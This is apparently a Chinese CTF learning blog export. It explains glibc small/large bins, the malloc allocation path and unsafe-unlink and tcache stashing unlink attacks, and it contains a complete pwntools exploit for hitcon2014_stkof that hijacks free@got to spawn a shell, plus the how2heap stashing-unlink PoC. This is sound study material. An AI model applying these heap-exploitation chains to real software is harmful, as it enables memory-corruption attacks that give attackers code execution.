<h1 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h1><h3 id="基本结构-2"><a href="#基本结构-2" class="headerlink" title="基本结构"></a>基本结构</h3><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/image-20210726103140256.png" style="zoom:80%;"><span class="image-caption">image-20210726103140256</span>

<ul>
<li>大小范围：0x90 - 0x400</li>
<li>由62个双向链表组成，每个链表中的chunk大小一样，大小以0x10递增，存在fd和bk指针</li>
<li>相邻的free chunk会触发合并操作，即合并成一个大的free chunk</li>
<li>采用的遍历顺序是FIFO</li>
</ul>
<h3 id="小技巧-2"><a href="#小技巧-2" class="headerlink" title="小技巧"></a>小技巧</h3><p>small bin 中存在两个块时，第一个块的fd指针指向main_arena，bk指针指向了下一个堆块，所以可以泄露出libc以及堆地址</p>
<h1 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h1><h3 id="基本结构-3"><a href="#基本结构-3" class="headerlink" title="基本结构"></a>基本结构</h3><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/image-20210720153655147.png" style="zoom:80%;"><span class="image-caption">image-20210720153655147</span>

<p><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/image-20210726103541056-1627363427270.png"><span class="image-caption">image-20210726103541056</span></p>
<ul>
<li>大小范围：0x410 以上</li>
<li>63个双向链表，不仅存在fd和bk指针，同时还有fd nextsize 和 bk nextsize</li>
<li>同一个双向链表中chunk大小可以不一样，但是在一定范围内，bins大小从小到大排列</li>
<li>相邻的free chunk会触发合并操作，即合并成一个大的free chunk</li>
<li>采用的遍历顺序是FIFO</li>
<li><strong>在这63个largebins中：第一组的32个largebin链</strong>依次以64字节步长为间隔，即第一个largebin链中chunksize为1024-1087字节，第二个large bin中chunk size为1088~1151字节。<strong>第二组的16个largebin链</strong>依次以512字节步长为间隔；<strong>第三组的8个largebin链</strong>以步长4096为间隔；<strong>第四组的4个largebin链</strong>以32768字节为间隔；<strong>第五组的2个largebin链</strong>以262144字节为间隔；<strong>最后一组</strong>的largebin链中的chunk大小无限制。</li>
</ul>
<h3 id="小技巧-3"><a href="#小技巧-3" class="headerlink" title="小技巧"></a>小技巧</h3><p>如果堆块在 largebin 中，他的 <strong>fd_nextsize</strong> 和 <strong>bk_nextsize</strong> 都会指向堆块地址，可以泄露出堆地址</p>
<p>如果largenbin上仅有一个堆块，那该堆块的fd_nextsize和bk_nextsize指向自身</p>
<h1 id="malloc过程"><a href="#malloc过程" class="headerlink" title="malloc过程"></a>malloc过程</h1><ul>
<li><p>计算真正堆块大小（加上头部长度、对齐）</p>
</li>
<li><p>是否在fastbin范围内？</p>
<ul>
<li>是，检查对应的bin链表中有没有chunk<ul>
<li>有，分配给用户，结束</li>
</ul>
</li>
</ul>
</li>
<li><p>如果不在fastbin范围内，或者没有chunk可用</p>
</li>
<li><p>是否在smallbin范围内？</p>
<ul>
<li>是，检查对应大小的bin链表中有没有chunk<ul>
<li>有，分配给用户，结束</li>
</ul>
</li>
</ul>
</li>
<li><p>如果不在smallbin范围内，或者smallbin里面也没有</p>
</li>
<li><p>unsortedbin中有没有chunk？</p>
<ul>
<li>有，从尾部取出第一个chunk，看看大小是否满足需求<ul>
<li>满足，切分后大小是否大于minsize？（64位下minisize为0x20）<ul>
<li>大于，切分块，返回给用户，剩下的块放进unsortedbin</li>
<li>小于或等于minsize，直接全部分配给用户，结束</li>
</ul>
</li>
<li>不满足，把这个块放入small/largebin对应的链表中，继续遍历下一个块</li>
</ul>
</li>
</ul>
</li>
<li><p>如果unsortedbin中所有的块也不能满足需求</p>
</li>
<li><p>大小是否在largebin范围？</p>
<ul>
<li>是，检查对应的bin链表中有没有符合的chunk<ul>
<li>有，找到满足需求最小的chunk，切分块返回，剩下的放进unsortedbin中</li>
</ul>
</li>
</ul>
</li>
<li><p>largebin也不行？再次遍历small/large寻找最合适的chunk</p>
</li>
<li><p>还是没有，那就从topchunk中切割</p>
</li>
<li><p>topchunk也不够？mmap系统调用</p>
</li>
</ul>
]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>不安全的unlink</title>
    <url>/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/</url>
    <content><![CDATA[<p>以下知识摘自《CTF竞赛权威指南 Pwn篇》、CTF-Wiki</p>
<h1 id="不安全的-unlink"><a href="#不安全的-unlink" class="headerlink" title="不安全的 unlink"></a>不安全的 unlink</h1><h2 id="什么叫-unlink"><a href="#什么叫-unlink" class="headerlink" title="什么叫 unlink"></a>什么叫 unlink</h2><p>为了避免堆内存的过度碎片化，当一个堆块（非fastbin chunk）被释放时，libc会查看其前后堆块是否处于被释放的状态，如果是，则将前面或后面的堆块从bins链取出来，与当前释放堆块合并，这个取出堆块的过程就叫做 unlink</p>
<p>基本过程如下图所示</p>
<p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/unlink_smallbin_intro.png"></p>
<p>上述的操作进行了如下的赋值</p>
<ul>
<li><p>*( fd + 0x18 ) = bk</p>
</li>
<li><p>*( bk + 0x10 ) = fd </p>
</li>
</ul>
<h3 id="unlink中的检查"><a href="#unlink中的检查" class="headerlink" title="unlink中的检查"></a>unlink中的检查</h3><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span><br><span class="hljs-keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="hljs-number">0</span>))      \<br>      malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);               \<br>      <br><span class="hljs-comment">// 检查 fd 和 bk 指针(双向链表完整性检查)</span><br><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))                      \<br>  malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \<br><br>  <span class="hljs-comment">// largebin 中 next_size 双向链表完整性检查 </span><br>              <span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="hljs-number">0</span>)              \<br>                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="hljs-number">0</span>))    \<br>              malloc_printerr (check_action,                                      \<br>                               <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>,P, AV);  \<br></code></pre></td></tr></table></figure>

<h2 id="利用unlink"><a href="#利用unlink" class="headerlink" title="利用unlink"></a>利用unlink</h2><p>要利用unlink首先要绕过上面提到的两个检查：</p>
<ol>
<li><p>size检查：</p>
<p>在堆中有两个地方存储了P的size：第一个是当前P-&gt;size，第二个是next_chunk-&gt;prev_size，比较两者大小</p>
</li>
<li><p>fd和bk检查：</p>
<p>检查P是否在双向链表中，在双向链表中有两个指针指向P：第一个是FD-&gt;bk，第二个是BK-&gt;fd</p>
</li>
</ol>
<p>在libc-2.27.so版本，要先填满tcache bin</p>
<h3 id="第一种思路"><a href="#第一种思路" class="headerlink" title="第一种思路"></a>第一种思路</h3><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ol>
<li>存在UAF可以修改P的fd和bk</li>
<li>存在一个指针指向P</li>
</ol>
<h4 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4><ol>
<li>通过UAF漏洞修改chunk0-&gt;fd=G_ptr-0x18，chunk0-&gt;bk=G_ptr-0x10，绕过fd和bk检查</li>
<li>free下一个chunk，chunk0和chunk1合并，chunk0发生unlink，修改了G_ptr的值</li>
</ol>
<h4 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h4><p>修改G_ptr=&amp;G_ptr-0x18。如果能够对G_ptr指向的空间进行修改，则可能导致任意地址读写。</p>
<p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/20201112000118623.png"><span class="image-caption">在这里插入图片描述</span></p>
<h3 id="第二种思路"><a href="#第二种思路" class="headerlink" title="第二种思路"></a>第二种思路</h3><h4 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h4><ol>
<li>可以修改p的下一个chunk-&gt;pre_size和inuse位</li>
<li>存在一个指针指向chunk p的内容部分</li>
</ol>
<h4 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h4><ol>
<li><p>伪造fake_chunk：fakechunk-&gt;size=chunk0-0x10，可以绕过size检查</p>
<p>fakechunk-&gt;fd=&amp;G_ptr-0x18，fakechunk-&gt;bk = &amp;G_ptr-&gt;0x10，绕过fd和bk检查</p>
</li>
<li><p>修改下一个chunk的prev_size=chunksize-0x10。因为fakechunk比chunk0小0x10</p>
</li>
<li><p>修改下一个chunk的inuse位</p>
</li>
<li><p>free下一个堆块chunk1。fake chunk和chunk1合并，fake chunk发生unlink，修改了G_ptr的值</p>
</li>
</ol>
<h4 id="效果-1"><a href="#效果-1" class="headerlink" title="效果"></a>效果</h4><p>修改G_ptr=&amp;G_ptr-0x18。如果能够对G_ptr指向的空间进行修改，则可能导致任意地址读写</p>
<p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/2020111123405646.png"><span class="image-caption">在这里插入图片描述</span></p>
<h2 id="例题hitcon2014-stkof"><a href="#例题hitcon2014-stkof" class="headerlink" title="例题hitcon2014_stkof"></a>例题hitcon2014_stkof</h2><p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831204845498.png"><span class="image-caption">image-20210831204845498</span></p>
<p>常规checksec一下，64位，开了NX、Canary</p>
<p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831211106261.png"><span class="image-caption">image-20210831211106261</span></p>
<p>进入IDA，额，有个选项为4的功能似乎并没有作用，然后溢出点存在与修改函数中，对于我们能修改的长度是不存在什么限制的，所以能很轻易的造成堆溢出</p>
<p>题目没开PIE，所以堆结构的地址是已知的，整个程序不存在打印功能。这边的思路是：</p>
<p>先通过unlink把堆结构上的堆指针改为在堆结构前的地址，从而可以控制堆结构，达成任意写；然后先修改 <code>s[1] = free@got</code> 地址，同时修改 <code>s[2] = puts@got</code> 地址；再一次编辑，实现覆写free@got为puts@plt,从而当调用 free 函数时，即可直接调用 puts 函数。这样就可以泄漏函数内容。然后free(s[2])，相当于执行了puts（puts@got）通过puts泄露puts@got的值，获得libc基地址，然后就可以获得system；最后修改再把free@got修改为system，对着写有/bin/sh\x00的堆块释放</p>
<p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831213326412.png"><span class="image-caption">image-20210831213326412</span></p>
<p>首先，这边第一个申请的chunk是不能被使用的，由于程序本身没有进行 setvbuf 操作，所以在执行输入输出操作的时候会申请缓冲区，所以我们在前面先分配一个 chunk 来把缓冲区分配完毕，以免影响之后的操作。具体的看ctfwiki这题的<a href="https://wiki.x10sec.org/pwn/linux/glibc-heap/unlink-zh/#io">IO 缓冲区问题分析</a>。所以第一个堆块不能用来做fakechunk</p>
<p>所以这边进行创造fake_chunk要注意！首先，堆块的索引从1开始；其次第一个不能用，所以我们要从堆结构的第二个地方作为地址</p>
<p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831214046823.png"><span class="image-caption">image-20210831214046823</span></p>
<p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831214232302.png"><span class="image-caption">image-20210831214232302</span></p>
<p>触发unlink，造成合并，同时堆结构指针的值被改为其地址 - 0x18</p>
<p>然后就是按照思路所说的，去修改堆结构即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./stkof&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28635</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>	p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>free_got=elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#4 防止合并</span><br>ptr = <span class="hljs-number">0x0000000000602150</span><br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x81</span>) <span class="hljs-comment">#fake_chunk header</span><br>fake_chunk += p64(ptr - <span class="hljs-number">0x18</span>) + p64(ptr - <span class="hljs-number">0x10</span>) <span class="hljs-comment">#fake_chunk fd  bk</span><br>fake_chunk += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x80</span>) + p64(<span class="hljs-number">0x90</span>) <span class="hljs-comment">#fake prev_size  size</span><br>edit(<span class="hljs-number">2</span>,fake_chunk)<br>free(<span class="hljs-number">3</span>)<br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(free_got) + p64(puts_got)<br>edit(<span class="hljs-number">2</span>,payload)<br>edit(<span class="hljs-number">1</span>,p64(puts_plt))<br>free(<span class="hljs-number">2</span>)<br>p.recv(<span class="hljs-number">0x20</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>log.success(<span class="hljs-built_in">hex</span>(libc_base))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>edit(<span class="hljs-number">1</span>,p64(system))<br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>free(<span class="hljs-number">4</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="新版本下的unlink"><a href="#新版本下的unlink" class="headerlink" title="新版本下的unlink"></a>新版本下的unlink</h2><p>在 glibc2.29 以上版本，glibc 在 unlink 内加入了 prevsize check。当然这个检测对于上面的unlink攻击是没有影响的，影响的是offbynull的攻击利用，不能直接通过修改size来制造堆块重叠。下面是新的检测机制源码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* consolidate backward */</span><br><span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>  prevsize = prev_size (p);<br>  size += prevsize;<br>  p = chunk_at_offset(p, -((<span class="hljs-keyword">long</span>) prevsize));<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))<br>    malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);<br>  unlink_chunk (av, p);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>具体关于offbynull带来的影响，可以移步我的另一篇博客offbyone&amp;null</p>
<h2 id="tcache-stashing-unlink"><a href="#tcache-stashing-unlink" class="headerlink" title="tcache stashing unlink"></a>tcache stashing unlink</h2><p>这是一个类unlink的攻击手法，利用版本从 glibc-2.27一直到最新的 glibc-2.34 仍然可以利用。</p>
<p>关键源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *<br>_int_malloc (mstate av, <span class="hljs-keyword">size_t</span> bytes) &#123;<br>...<br>	<span class="hljs-keyword">if</span> (in_smallbin_range (nb)) &#123;<br>	...<br>	    <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin) &#123;<br>	    ...<br>	    	 <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">             stash them in the tcache.  */</span><br>          <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (nb);<br>          <span class="hljs-comment">//①: 如果tchace不满</span><br>          <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123;<br>              mchunkptr tc_victim;<br>              <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span><br>              <span class="hljs-comment">//②: tcache不满且smallbin还有剩，则进入循环</span><br>              <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<br>                     &amp;&amp; (tc_victim = last (bin)) != bin) &#123;<br>                  <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>) &#123;<br>                  <span class="hljs-comment">//③: bk是攻击者控制的，故bck是目标地址附近的内存。这里没有double link check</span><br>                      bck = tc_victim-&gt;bk;<br>                      set_inuse_bit_at_offset (tc_victim, nb);<br>                      <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                        set_non_main_arena (tc_victim);<br>                      bin-&gt;bk = bck;<br>                      <span class="hljs-comment">//④: 一个目标地址的写操作</span><br>                      bck-&gt;fd = bin;<br>                      tcache_put (tc_victim, tc_idx);<br>                    &#125;<br>                &#125;<br>            &#125;<br>	    &#125;<br>	&#125;<br>...<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>上面的源码过程总结为：</p>
<p>设需求的size为nb个字节；如果nb大小的tcache不满( 小于7 )，并且有2个以上nb大小的freed chunk 在smallbin中；在_int_malloc(av, nb)过程中，<code>会尝试把剩下的nb大小的smallbin放到tcache中</code>。</p>
<p>可以通过下面的how2heap的poc进行深入的gdb调试学习</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> stack_var[<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *chunk_lis[<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *target;<br><br>    <span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This poc has been tested on both glibc-2.27, glibc-2.29 and glibc-2.31.\n\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\n\n&quot;</span>);<br><br>    <span class="hljs-comment">// stack_var emulate the fake_chunk we want to alloc to</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);<br><br>    stack_var[<span class="hljs-number">3</span>] = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(&amp;stack_var[<span class="hljs-number">2</span>]);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="hljs-keyword">void</span>*)stack_var[<span class="hljs-number">3</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="hljs-keyword">void</span>*)stack_var[<span class="hljs-number">4</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);<br><br>    <span class="hljs-comment">//now we malloc 9 chunks</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">9</span>;i++)&#123;<br>        chunk_lis[i] = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//put 7 chunks into tcache</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">3</span>;i &lt; <span class="hljs-number">9</span>;i++)&#123;<br>        <span class="hljs-built_in">free</span>(chunk_lis[i]);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);<br><br>    <span class="hljs-comment">//last tcache bin</span><br>    <span class="hljs-built_in">free</span>(chunk_lis[<span class="hljs-number">1</span>]);<br>    <span class="hljs-comment">//now they are put into unsorted bin</span><br>    <span class="hljs-built_in">free</span>(chunk_lis[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">free</span>(chunk_lis[<span class="hljs-number">2</span>]);<br><br>    <span class="hljs-comment">//convert into small bin</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);<span class="hljs-comment">// size &gt; 0x90</span><br><br>    <span class="hljs-comment">//now 5 tcache bins</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="hljs-keyword">void</span>*)stack_var);<br><br>    <span class="hljs-comment">//change victim-&gt;bck</span><br>    <span class="hljs-comment">/*VULNERABILITY*/</span><br>    chunk_lis[<span class="hljs-number">2</span>][<span class="hljs-number">1</span>] = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)stack_var;<br>    <span class="hljs-comment">/*VULNERABILITY*/</span><br><br>    <span class="hljs-comment">//trigger the attack</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);<br><br>    <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="hljs-keyword">void</span>*)stack_var[<span class="hljs-number">2</span>],(<span class="hljs-keyword">void</span>*)stack_var[<span class="hljs-number">4</span>]);<br><br>    <span class="hljs-comment">//malloc and return our fake chunk on stack</span><br>    target = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);   <br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="hljs-keyword">void</span>*)target);<br><br>    <span class="hljs-built_in">assert</span>(target == &amp;stack_var[<span class="hljs-number">2</span>]);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h4><p>1.<code>smallbin</code>中可以控制大小为size块的bk指针</p>
<p>2.<code>tcache</code>中大小为size块的个数为6</p>
<p>3.申请堆块是<code>calloc</code></p>
<h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><ul>
<li>释放6个0x100的chunk到tcache bin中</li>
<li>构造两个0x100的small bin（利用Unsorted bin或Large bin切割得到）</li>
<li>修改后插入的small bin的 bk 指针为目标地址-0x10，且保持fd指针不变</li>
<li>用calloc分配0x100的chunk</li>
</ul>
<h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><ul>
<li>在目标地址上写入原本small bin上的 bk 指针内容</li>
</ul>
]]></content>
      <tags>
        <tag>unlink</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn</title>
    <url>/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/</url>
    <content><![CDATA[<h3 id="一、pwny"><a href="#一、pwny" class="headerlink" title="一、pwny"></a>一、pwny</h3><p>先checksec一下</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/4.png"></p>
<p>保护全开了，进入ida看看代码。</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/QQ%E5%9B%BE%E7%89%8720210523174951.png"></p>
<p>三个功能，主要看read和write两个，其次注意在循环的顶上有个函数。</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/QQ%E5%9B%BE%E7%89%8720210523175036.png"></p>
<p>这里面，有一个定义的变量，存放了随机数的文字描述符。这里的变量作为后面两个功能里面的read的第一个参数，所以我们是无法输入数据的。</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/QQ%E5%9B%BE%E7%89%8720210523175133.png"></p>
